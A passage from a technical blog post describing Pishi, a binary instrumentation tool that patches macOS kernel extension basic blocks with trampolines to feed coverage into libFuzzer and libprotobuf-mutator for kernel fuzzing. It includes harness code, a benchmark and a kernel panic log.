    <span class="s">'asr'</span><span class="p">,</span>   <span class="s">'strb'</span><span class="p">,</span>   <span class="s">'sbfx'</span><span class="p">,</span>  <span class="s">'bfi'</span><span class="p">,</span>  
    <span class="s">'strh'</span><span class="p">,</span>  <span class="s">'xtn'</span><span class="p">,</span>    <span class="s">'uxtn'</span><span class="p">,</span>  <span class="s">'sxtw'</span><span class="p">,</span>
    <span class="s">'sxtb'</span><span class="p">,</span>  <span class="s">'sxth'</span><span class="p">,</span>   <span class="s">'uxth'</span><span class="p">,</span>  <span class="s">'uxtb'</span>
    <span class="p">]</span></code></pre></figure>

<p>Without any need for adjusting, we can easily copy and execute this instructions somwhere else in the memory.</p>

<h4 id="bbs-are-disjoint-sets">BBs are Disjoint sets</h4>

<p>If the first instruction of the BB is a relative instruction, additional effort is required for instrumentation.
but it was also obvious that the location of instrumentated instruction within each basic block (BB) does not matter.
<em>each instruction inside one basic block represent that basic block equally.</em></p>

<p>Each basic block can be considered as a disjoint set of all addresses, which is essential for the following proof.</p>

<p><img src="/assets/pishi/set.png" width="850" style="display: block; margin: 0 auto" />
<img src="/assets/pishi/28.png" width="300" style="display: block; margin: 0 auto" /></p>

<p>In the above image, any one of the arrowed instructions of the BB can be instrumented.</p>

<h4 id="coverage-efficiency">Coverage efficiency</h4>

<p>To evaluate the efficiency of our instrumentation strategy, I instrumented IOSurface based on the above assumptions, we will instrument 6008 basic blocks (BBs) out of 7941.</p>

<p>The remaining 1933 BBs as depicted in the following picture are mostly single-size BBs, containing only a single <code class="language-plaintext highlighter-rouge">unconditional jump</code> instruction, which do not contribute to the program’s logic and can be ignored.
the question of whether an unconditional jump marks the end of a basic block is open to <a href="https://stackoverflow.com/questions/17684313/what-constitutes-the-start-of-a-basic-block">debate</a>.</p>

<p><img src="/assets/pishi/31.png" width="300" style="display: block; margin: 0 auto" /></p>

<p>We also classify basic blocks that contain a single <code class="language-plaintext highlighter-rouge">unconditional jump</code> or <code class="language-plaintext highlighter-rouge">ret</code> along with the <code class="language-plaintext highlighter-rouge">bti</code> instruction as a single-sized basic block or thunks.
<code class="language-plaintext highlighter-rouge">bti</code> or <a href="https://en.wikipedia.org/wiki/Indirect_branch_tracking">branch target identification</a> instructions similar to PAC are not part of the program’s intended behavior; there are emited by compiler to protect against <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return-oriented programming</a>.
<img src="/assets/pishi/bti.png" width="300" style="display: block; margin: 0 auto" /></p>

<p>Furthermore <code class="language-plaintext highlighter-rouge">ldr</code> is relative instruction when its operand is a label.</p>

<p>If we only add <code class="language-plaintext highlighter-rouge">ldr</code> to above the list we will have:</p>
<ol>
  <li>1214 BBs with just one <code class="language-plaintext highlighter-rouge">b</code>, approximately 15.29%</li>
  <li>19 BBs we couldn’t instrument, approximately 0.24%</li>
  <li>6708 BBs we instrumented, approximately 84.47%</li>
</ol>

<p>This means we have instrumented 99.72% of valuable BBs. BBs with at least one data movement, arithmetic, logical, shift and rotate, etc instruction.</p>

<h4 id="putting-everything-togeter">Putting everything togeter.</h4>
<p><em>Before continuing, I should mention that Pishi also accepts address ranges, allowing you to precisely target what you want to instrument.</em></p>

<p>Given all above facts and assumtions 
we can write a ghidra script that does following steps in <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code>:</p>

<ol>
  <li>Find the trampolines we had filled in our KEXT with <code class="language-plaintext highlighter-rouge">.rept .endr</code> macros.</li>
  <li>Find all BBs in requested <code class="language-plaintext highlighter-rouge">address ranges</code>, or target <code class="language-plaintext highlighter-rouge">KEXT</code>.</li>
  <li>Loop into BBs:
    <ol>
      <li>Find first non-relative instruction in it.</li>
      <li>Replace the instruction with a jump to the trampoline.</li>
      <li>Fix the trampoline: orginal instruction, BB’s ID, a jump back to the next address of instrumented instruction.</li>
      <li>Use next trampoline.</li>
    </ol>
  </li>
</ol>

<p>I also have to note that the ghidra script was maddeningly slow, due to the fact that it had to instrumnt tens of thousands BBs in each KEXT file.
After some investigation, I managed to replace the bottleneck function in Ghidra with a super-fast version.</p>

<p>Let’s see the results following image is the Boot Kext Collection aftre instrumentation.
left side instrumented BB and right side is the fixed trampoline.</p>

<p><img src="/assets/pishi/30.png" style="display: block; margin: 0 auto" /></p>

<h4 id="collecting-coverage">Collecting Coverage</h4>

<p>Now that we have instrumented the BBs, we can collect coverage inside our <code class="language-plaintext highlighter-rouge">_sanitizer_cov_trace_pc</code> function.<br />
My implementation of <code class="language-plaintext highlighter-rouge">_sanitizer_cov_trace_pc</code> resembles Linux KCOV. It collects coverage exclusively for the target thread, assigned through an IOCTL. The collected data is then written into <code class="language-plaintext highlighter-rouge">coverage_area</code>, a shared memory between the fuzzer process (EL0) and Pishi’s KEXT (EL1).</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">sanitizer_cov_trace_pc</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">kext</span><span class="p">,</span> <span class="kt">uintptr_t</span> <span class="n">address</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">__improbable</span><span class="p">(</span><span class="n">do_instrument</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* number of cases we want to reject due to wrong thread id is a lot more than targeted_kext so we compare it first. */</span>
        <span class="k">if</span><span class="p">(</span> <span class="n">__improbable</span><span class="p">(</span><span class="n">instrumented_thread</span> <span class="o">==</span> <span class="n">thread_tid</span><span class="p">(</span><span class="n">current_thread</span><span class="p">()))</span> <span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* 
                I just added targeted_kext to be able to instument multiple KEXTs at once,
                instead of build/install/boot for each KEXT. simple benchmark shows it has not that much performance penalty.
            */</span>
            <span class="k">if</span> <span class="p">(</span> <span class="n">__probable</span><span class="p">(</span> <span class="p">(</span><span class="n">targeted_kext</span> <span class="o">&amp;</span> <span class="n">kext</span><span class="p">)</span> <span class="o">==</span> <span class="n">kext</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span> <span class="n">__improbable</span><span class="p">(</span><span class="n">coverage_area</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">)</span>
                    <span class="k">return</span><span class="p">;</span>
                
                <span class="cm">/* The first 64-bit word is the number of subsequent PCs. */</span>
                <span class="k">if</span> <span class="p">(</span> <span class="n">__probable</span><span class="p">(</span><span class="n">coverage_area</span><span class="o">-&gt;</span><span class="n">kcov_pos</span> <span class="o">&lt;</span> <span class="mh">0x20000</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">coverage_area</span><span class="o">-&gt;</span><span class="n">kcov_pos</span><span class="p">;</span>
                    <span class="n">coverage_area</span><span class="o">-&gt;</span><span class="n">kcov_area</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">address</span><span class="p">;</span>
                    <span class="n">coverage_area</span><span class="o">-&gt;</span><span class="n">kcov_pos</span> <span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
          <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p><img src="/assets/pishi/collect.png" width="450" style="display: block; margin: 0 auto" /></p>

<h4 id="how-to-feed-the-coverage-to-a-fuzzer">How to feed the coverage to a fuzzer?</h4>

<p>We need to tune a fuzzer to be able to feed our coverag into it, once I have used libFuzzer’s <code class="language-plaintext highlighter-rouge">Extra coverage counters</code>,
you can read about it in my another blog post here <a href="https://r00tkitsmm.github.io/fuzzing/2024/03/27/libffuzzerkernel.html">Structure-Aware Linux kernel Fuzzing with libFuzzer</a>.</p>

<p>libFuzzer <a href="https://github.com/llvm/llvm-project/blob/main/compiler-rt/lib/fuzzer/FuzzerLoop.cpp#L522">collects</a> different signals to evaluate the code coverage: edge coverage, edge counters, value profiles, indirect caller/callee pairs, etc. These signals combined are called features (ft:). Extra coverage counters is also part of the features.<br />
If you check how libFuzzer collects coverages in the <code class="language-plaintext highlighter-rouge">TracePC::CollectFeatures</code> method, you will see that similar to <code class="language-plaintext highlighter-rouge">-fsanitize-coverage=inline-8bit-counters</code>,  the extra counter is also an array of <a href="https://github.com/llvm/llvm-project/blob/main/compiler-rt/lib/fuzzer/FuzzerTracePC.h#L261">8-bit counters</a>.</p>

<p>With <code class="language-plaintext highlighter-rouge">-fsanitize-coverage=inline-8bit-counters</code> the compiler will insert inline counter increments on every BB. This is similar to the depricate <code class="language-plaintext highlighter-rouge">-fsanitize-coverage=trace-pc-guard</code> flag but instead of a callback the instrumentation simply increments a counter.( in the next blog post we will also increment counters inline and and optimize away function calls)</p>

<p>Unfortunately, it seems that the macOS version of libFuzzer <a href="https://reviews.llvm.org/D106676">has not</a> implemented <code class="language-plaintext highlighter-rouge">Extra coverage counters</code>. this is not a big probalem, we can add this functionality into it, we just need to export a buffer and add some changes to <a href="https://github.com/llvm/llvm-project/blob/main/compiler-rt/lib/fuzzer/FuzzerExtraCountersDarwin.cpp">FuzzerExtraCountersDarwin.cpp</a> file, then build LLVM.</p>

<p><img src="/assets/pishi/33.png" width="7800" style="display: block; margin: 0 auto" /></p>

<p>With above patch the fuzzer can collect the coverage over the shared memory and feed it into libFuzzer,</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">pishi_collect</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="nc">pishi</span> <span class="o">*</span><span class="n">coverage</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">pishi</span> <span class="o">*</span><span class="p">)</span><span class="n">mc</span><span class="p">.</span><span class="n">ptr</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">coverage</span><span class="o">-&gt;</span><span class="n">kcov_pos</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">coverage</span><span class="o">-&gt;</span><span class="n">kcov_area</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="n">_pishi_libfuzzer_coverage</span><span class="p">[</span><span class="n">pc</span> <span class="o">%</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_pishi_libfuzzer_coverage</span><span class="p">)]</span><span class="o">++</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>Our KEXT resets the <code class="language-plaintext highlighter-rouge">kcov_pos</code> for the next iteration. libfuzzer also cleans its own counter with <a href="https://github.com/rust-fuzz/libfuzzer/blob/main/libfuzzer/FuzzerLoop.cpp#L145">ClearExtraCounters</a> function.</p>

<p>Let’s apply instrumentation to our sample <code class="language-plaintext highlighter-rouge">fuzz_me</code> function to see if the fuzzer works properly.<br />
As you can see in the video, we will get a kernel panic in some seconds.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">extern</span> <span class="s">"C"</span> <span class="kt">int</span> <span class="nf">LLVMFuzzerTestOneInput</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> 
<span class="p">{</span>
  <span class="n">pishi_start</span><span class="p">(</span><span class="n">PISHI_SAMPLE</span><span class="p">);</span>
  <span class="kt">uintptr_t</span> <span class="o">**</span><span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data</span><span class="p">;</span>
  <span class="n">ioctl</span><span class="p">(</span><span class="n">pishi_fd</span><span class="p">,</span> <span class="n">PISHI_IOCTL_FUZZ</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
  <span class="n">pishi_stop</span><span class="p">();</span>
  <span class="n">pishi_collect</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<iframe width="460" height="315" style="display: block; margin: 0 auto" src="https://www.youtube.com/embed/ohOfCpG1eok?si=boPPyIG_MPy9rZRx" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
<p><br />
<br />
As you see, each time libFuzzer finds a new BB, it increments <code class="language-plaintext highlighter-rouge">ft:</code>, i.e., the features described earlier.</p>

<h4 id="mission-accomplished">Mission accomplished!</h4>
<p>At this point we have setup everything, we just need to instrument <code class="language-plaintext highlighter-rouge">com.apple.driver.AppleAVD</code> and enjoy our coverage-guided fuzzing of AppleAVD.<br />
is’t this cool?</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">LLVMFuzzerInitialize</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">***</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>
  <span class="n">service</span> <span class="o">=</span> <span class="n">IOServiceGetMatchingService</span><span class="p">(</span><span class="n">kIOMainPortDefault</span><span class="p">,</span> <span class="n">IOServiceMatching</span><span class="p">(</span><span class="s">"AppleAVD"</span><span class="p">));</span>
  <span class="n">IOServiceOpen</span><span class="p">(</span><span class="n">service</span><span class="p">,</span> <span class="n">mach_task_self</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">connect</span><span class="p">);</span>
  <span class="p">...</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="s">"C"</span> <span class="kt">int</span> <span class="n">LLVMFuzzerTestOneInput</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">pishi_start</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">....</span>
  <span class="n">IOConnectCallMethod</span><span class="p">(</span>
      <span class="n">connect</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
      <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span>
      <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">output_scalars_count_result</span><span class="p">,</span>
      <span class="n">output_structure</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">output_structure_size_result</span><span class="p">);</span>

  <span class="n">pishi_stop</span><span class="p">();</span>
  <span class="n">pishi_collect</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<h4 id="the-final-design">The final design</h4>

<p>The final design of our fuzzer could be as follows, we will embed our KEXT into the Boot Kext Collection then instrument all basic blocks within the target KEXT in <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code>.</p>

<p>Our KEXT will allocate and map a shared memory inside the fuzzer process.<br />
in case of fuzzing stateless kerenl components, like a buffer or a memory parser, you can continus using In-memory Looping.<br />
but in case of stateful APIs,
in each iteration fuzzer can fork a new harness inside libFuzzer’s <code class="language-plaintext highlighter-rouge">LLVMFuzzerTestOneInput</code>, the forked process will inherit our <code class="language-plaintext highlighter-rouge">fd</code> and the new generated input, then the child would enable coverage with the inherited <code class="language-plaintext highlighter-rouge">fd</code> for the current thread and after stop and exit, parnet would collect the coverage. so next fork would have a <em>semi-fresh</em> kernel state. otherwise each iteration would affect next one via leaked resoruces(fd, mach ports, memory, task,…) if you miss closing them, most of the resouces will be automatically closed when the process <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/_Exit.html#tag_16_01_03_01">terminates</a>, regardless of the reason for the process termination. but there could be some that outlive the process after termination.( for example allocated netfilter objects in Linux). <a href="https://github.com/google/syzkaller/blob/master/executor/executor.cc">syzkaller</a> also has its own way of having a fresh state for each execution.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">LLVMFuzzerTestOneInput</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span> 
  <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Pishi_start_coverage</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">do_fuzz</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="n">pishi_stop_coverage</span><span class="p">();</span>
    <span class="c1">// exit</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="n">pishi_collect_coverage_in_parent</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p><img src="/assets/pishi/23.png" width="500" style="display: block; margin: 0 auto" /></p>

<h4 id="performace-and-benchmark">Performace and Benchmark</h4>

<p>to have a very basic and straightforward understanding of performance degradation,<br />
I instrumented <code class="language-plaintext highlighter-rouge">com.apple.filesystems.apfs</code> in macOS with Pishi and <a href="https://github.com/torvalds/linux/tree/master/fs/ext4">ext4 directoty</a> of Linux kernel with KCOV and executed an IO/File system intensive program.</p>

<p><img src="/assets/pishi/performance.png" width="500" style="display: block; margin: 0 auto" /></p>

<h4 id="saving-some-cpu-cycles">Saving some CPU cycles.</h4>
<p>Despite having no tangible runtime overhead, with a little effort, we can embed <code class="language-plaintext highlighter-rouge">_sanitizer_cov_trace_pc</code> into trampoline, as well as optimizing  <code class="language-plaintext highlighter-rouge">_push_regs</code> and <code class="language-plaintext highlighter-rouge">_pop_regs</code> away by saving and restoring only clobbered registers, we can save some unnecessary CPU cycles per instrumented BB.</p>

<h4 id="how-to-instrument-xnu">How to instrument XNU?</h4>

<p>Unlike KEXTs we can’t just enumerate all BBs in XNU kernel and instrumenting them.
some functions can’t be instrumented e.g <a href="https://github.com/apple-oss-distributions/xnu/blob/main/san/coverage/kcov-blacklist-arm64">kcov-blacklist-arm64</a> and <a href="https://github.com/apple-oss-distributions/xnu/blob/main/san/coverage/kcov-blacklist">kcov-blacklist</a>. I also found some more non-instrumentable functions in my tests.</p>

<p>So how can we filter these functions out?
The XNU kernel binary is stripped of symbols and function names, except exported functions.
but kernels inside KDK come with <a href="https://en.wikipedia.org/wiki/DWARF">DWARF</a> file, and the offsets of kernel functions within the <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code> and within the <code class="language-plaintext highlighter-rouge">DWARF</code> files are same.<br />
therefore we can create <code class="language-plaintext highlighter-rouge">[Function Name, Offset]</code> pairs for the functions we want to instrument from the DWARF file, and then use this information to instrument intended targets within the <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code>.
this is the point were you can target one path, a file or a function inside XNU soruce tree. as I told in the introduction.</p>

<p><img src="/assets/pishi/25.png" width="600" style="display: block; margin: 0 auto" /></p>

<h4 id="stateful-fuzzing-with-libprotobuf-mutator">Stateful fuzzing with libprotobuf-mutator</h4>
<p>Another way to describe fuzzing is that we want to generated inputs for a target <a href="https://en.wikipedia.org/wiki/Finite-state_machine">State Machine</a>, in hope for a transition into an unintended <a href="https://en.wikipedia.org/wiki/Weird_machine">state</a>.</p>

<p>for stateful APIs the accepted inputs are valid sequance of APIs that each API or state transition remembers preceding states/context(opened fd, socket, handle,…) in case it has context dependency to the previous states. for example <code class="language-plaintext highlighter-rouge">write</code> system call has context dependency on <code class="language-plaintext highlighter-rouge">open</code> system call.</p>

<p>We can describes these APIs in Protobuf’s language, in this way we have a convenient way to serialize a instance of this structured data, and libprotobuf-mutator provides an easy way to mutate it.</p>

<p>As I told before, Pishi supports instrumenting XNU kernel. 
and we have made libFuzzer aware of Pishi, so nothing prevenst us to use libprotobuf-mutator to have <a href="https://www.ndss-symposium.org/ndss-paper/mock-optimizing-kernel-fuzzing-mutation-with-context-aware-dependency/">Context-aware</a>, structure-aware, feedback-aware XNU fuzzing similar to <a href="https://github.com/googleprojectzero/SockFuzzer">SockFuzzer</a>.
<a href="https://www.youtube.com/watch?v=U60hC16HEDY">More</a> <a href="https://www.youtube.com/watch?v=xzG0pLM4Q64">info</a> <a href="https://media.ccc.de/v/35c3-9579-attacking_chrome_ipc">about</a> <a href="https://www.youtube.com/watch?v=S8JvzWDnjc0">libprotobuf-mutator</a>.</p>

<p>for example, if we instrument the following directories, Mach IPC and VM subsystems of XNU with Pishi.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">osfmk</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">"/osfmk/ipc"</span><span class="p">,</span>
    <span class="s">"/osfmk/vm"</span><span class="p">,</span>
    <span class="s">"/osfmk/voucher"</span><span class="p">,</span>
<span class="p">]</span></code></pre></figure>

<p>We can then perform fuzzing using a protobuf similar to the one shown below.</p>

<figure class="highlight"><pre><code class="language-protobuf" data-lang="protobuf"><span class="c1">// mach.proto</span>
<span class="kd">message</span> <span class="nc">Session</span> <span class="p">{</span>
  <span class="k">repeated</span> <span class="n">Command</span> <span class="na">commands1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">message</span> <span class="nc">Command</span> <span class="p">{</span>
  <span class="k">oneof</span> <span class="n">command</span> <span class="p">{</span>
    <span class="n">MachPortNames</span> <span class="na">machPortNames</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// API: mach_port_names</span>
    <span class="c1">// ....</span>
    <span class="n">MachVmAllocate</span> <span class="na">machvmallocate</span> <span class="o">=</span> <span class="mi">44</span><span class="p">;</span> <span class="c1">// API: mach_vm_allocate</span>
  <span class="p">}}</span></code></pre></figure>

<p>Within just less than an hour, I managed to identify an unexploitable race condition deep inside <code class="language-plaintext highlighter-rouge">mach_msg</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">panic</span><span class="p">(</span><span class="n">cpu</span> <span class="mi">1</span> <span class="n">caller</span> <span class="mh">0xfffffe0015cbee28</span><span class="p">)</span><span class="o">:</span> <span class="n">PAC</span> <span class="n">failure</span> <span class="n">from</span> <span class="n">kernel</span> <span class="n">with</span> <span class="n">DA</span> <span class="n">key</span> <span class="k">while</span> <span class="n">authing</span> <span class="n">x16</span> <span class="n">at</span> <span class="n">pc</span> <span class="mh">0xfffffe001549d268</span><span class="p">,</span> <span class="n">lr</span> <span class="mh">0x95bcfe001548e020</span> <span class="p">(</span><span class="n">saved</span> <span class="n">state</span><span class="o">:</span> <span class="mh">0xfffffe401e3af650</span><span class="p">)</span></code></pre></figure>

<h4 id="booting-macos">Booting macOS</h4>

<p>I have tested the instrumented kernel on a real Macbook and Parallels Desktop, Starting with <a href="https://kb.parallels.com/129232">Parallels Desktop 18</a>, it’s possible to boot into Recovery Mode.</p>

<p>Another option is use <code class="language-plaintext highlighter-rouge">Virtualization.framework</code> directly or via <a href="https://github.com/utmapp/UTM">UTM</a>, do you want to read two fantastic articles about it?</p>
<ol>
  <li><a href="https://gist.github.com/steven-michaud/fda019a4ae2df3a9295409053a53a65c">Running Third Party Kernel Extensions on Virtualization Framework macOS Guest VMs</a></li>
  <li><a href="https://gist.github.com/steven-michaud/16cff5628850799e428a2f2c56029677">Custom Boot Objects in Virtualization Framework macOS Guest VMs</a></li>
</ol>

<p>The ability to boot an instrumented Boot Kext Collection a real MacBook enables you to fuzz KEXTs that are unavailable in a virtual machine environment.</p>

<h4 id="libfuzzer-syzkaller-and-more">libFuzzer, syzkaller, and more</h4>
<p>I described using libFuzzer to fuzz stateless inputs like AppleAVD and AppleJPEGDriver.
and libprotobuf-mutator to fuzz stateful APIs like XNU’s mach traps and system calls.</p>

<p><a href="https://github.com/google/syzkaller">syzkaller</a> is another popular fuzzer. you can fuzz the XNU kernel using syzkaller and Pishi. 
at the time of writing this blog, Pishi’s kernel module needs a slight change to be able to hook into syzkaller, but it’s just matter of changing some IOCTLs.</p>

<p>Finally, I have to emphasize again that Pishi is instrumneation tool you can hook it into any off-the-shelf fuzzer you like. including <a href="https://github.com/google/honggfuzz">honggfuzz</a>, <a href="https://blog.ritsec.club/posts/afl-under-hood/">AFL++</a> or <a href="https://github.com/AFLplusplus/LibAFL">LibAFL</a> with some Rust magic, it’s easy to add custom instrumentation backends to LibAFL.</p>

<p>From now on, it’s simply a matter of implementing your harness for any target you choose.</p>

<h4 id="remote-attack-surfaces">Remote attack surfaces.</h4>
<p>Pishi can be used to fuzz remote attack vectors such as the WiFi and Bluetooth stacks, as well as SMB, CIFS, and NFS, Similar to how <a href="https://www.uni-goettingen.de/de/document/download/6b0d1e9d8e2fb7f57cc1a2fab1b071e7.pdf/huster_S&amp;P24.pdf">“To Boldly Go Where No Fuzzer Has Gone Before”</a> paper approached the topic.</p>

<p>As a basic test, instrument the <code class="language-plaintext highlighter-rouge">com.apple.filesystems.smbfs</code> module. Share a folder in a virtual machine and mount it externally. Then, execute a simple command like <code class="language-plaintext highlighter-rouge">ls</code> to observe the coverage results within the VM. with a slightly modified <code class="language-plaintext highlighter-rouge">_sanitizer_cov_trace_pc</code> you can view the coverage.</p>

<p>if we are fuzzing remote attack surfaces with VM and the fuzzer is running in the Host, then we need to <a href="https://tracingsummit.org/ts/2012/files/Tracing-summit-2012-virtio-trace.pdf">share the coverage</a> from Guest OS to Host OS. The only practical way is using shared memory.</p>

<p>Unfortunately, neither <a href="https://www.qemu.org/docs/master/system/devices/ivshmem.html">ivshmem</a> nor virtIO-shmem is supported by the Virtualization.framework or QEMU (and thus UTM) on macOS.
otherwise it would have been super easy to <a href="https://liujunming.top/2021/11/30/QEMU-tutorial-Inter-VM-Shared-Memory-device/">Inter-VM Shared Memory</a>.</p>

<p>We will discuss this solution architect in detail later, but briefly, to have an efficient and real-time/low latency communication between the host and guest in QEMU. One solution is to use a <a href="https://blog.davidv.dev/posts/learning-pcie/">custom PCI/PCIe device(VirtIO,…) to share a memory(again MMIO)</a> backed by a shared memory in the Host, and mapping that memory(PCI <a href="https://stackoverflow.com/questions/30190050/what-is-the-base-address-register-bar-in-pcie">BARs</a>) inside the kernel or user mode of the Guest OS, unfortunately we don’t have a luxury of Linux to simply mapping BARs via <code class="language-plaintext highlighter-rouge">\dev\mem</code> in macOS. you have to set <code class="language-plaintext highlighter-rouge">kmem=1</code> in your <code class="language-plaintext highlighter-rouge">boot-args</code> on DEBUG kernel, in case of using release build, we need to have a PCI side inside our Pishi KEXT.</p>

<p><img src="/assets/pishi/pci.png" width="350" style="display: block; margin: 0 auto" /></p>

<p>This enables us not only to collect coverage but also to interact with the potential an agent inside.</p>

<p>We might be able to locally mount the SMB and run the harness there, without needing to share the coverage outside.
but using VM is more generic way.</p>

<h4 id="another-approach">Another approach?</h4>
<p>I was considering an alternative approach If everything had failed, the well known method of replacing each BB of a target KEXT with a <a href="https://developer.arm.com/documentation/102120/0101/Debug-exceptions">breakpoint</a> or an illegal instruction, then boot a <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code> with modified <a href="https://github.com/apple-oss-distributions/xnu/blob/8d741a5de7ff4191bf97d57b9f54c2f6d4a15585/osfmk/arm64/sleh.c#L909">EL1 exception handler</a> in XNU that would log and restore every trapped BBs.</p>

<p><a href="https://github.com/YungRaj/MacRootKit">MacRootKit</a> is also another (very good) promising way, it’s trying to boot XNU with <code class="language-plaintext highlighter-rouge">hypervisor.framework</code>, and with it’s own <a href="https://gist.github.com/imbushuo/51b09e61ecd7b7ac063853ad65cedf34">hypervisor</a> it can have full control over the system. it’s still a work in progress, to be able to boot XNU.</p>

<p><a href="https://blog.impalabs.com/2211_hyperpom.html">Hyperpom</a>, a cool Rust project, is a good example of using a <code class="language-plaintext highlighter-rouge">hypervisor.framework</code> to collect code coverage. 
This project also uses breakpoints to trap into the <a href="https://developer.arm.com/documentation/dui0801/l/Overview-of-AArch64-state/Exception-levels">EL2</a>, As you can see in the <a href="https://docs.rs/hyperpom/latest/hyperpom/hooks/struct.Hooks.html">excerpt of</a> their ASCII art.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp">  <span class="n">Original</span> <span class="n">instructions</span>           <span class="n">Hooked</span> <span class="n">instructions</span>
  <span class="o">+----------------------+</span>        <span class="o">+----------------------+</span>
  <span class="o">|</span> <span class="mh">0x00</span><span class="o">:</span> <span class="n">mov</span> <span class="n">x0</span><span class="p">,</span> <span class="mh">0x42</span>   <span class="o">|</span>        <span class="o">|</span> <span class="mh">0x00</span><span class="o">:</span> <span class="n">mov</span> <span class="n">x0</span><span class="p">,</span> <span class="mh">0x42</span>   <span class="o">|</span>
  <span class="o">|</span> <span class="mh">0x04</span><span class="o">:</span> <span class="n">mov</span> <span class="n">x1</span><span class="p">,</span> <span class="mh">0x43</span>   <span class="o">|-------&gt;|</span> <span class="mh">0x04</span><span class="o">:</span> <span class="n">brk</span> <span class="err">#</span><span class="mi">0</span>  <span class="o">--------------&gt;</span> <span class="n">executes</span> <span class="n">handler</span>
